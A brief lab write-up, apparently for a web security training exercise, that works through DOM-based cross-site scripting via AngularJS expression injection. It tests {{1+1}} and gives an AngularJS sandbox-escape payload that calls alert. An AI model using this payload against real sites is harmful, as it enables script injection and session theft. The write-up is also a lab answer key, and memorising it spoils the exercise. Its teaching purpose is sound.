# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**End Goal:** Perform a cross-site scripting attack that executes an AngularJS expression and calls the `alert` function.

**Analysis**

*Inside an ng-app region, AngularJS evaluates anything in double curly braces {{ }} as an expression. Test if my input gets evaluated.*

{{1+1}}

*Got 0 search results for '2' so Angular is running my expression. No angle brackets or quotes needed.*

{{alert(1)}}

*Got 0 search results for ''. AngularJS runs expressions in a sandbox that blocks `alert`, `window`, etc.*

**Answer:** 

{{$on.constructor('alert(1)')()}}



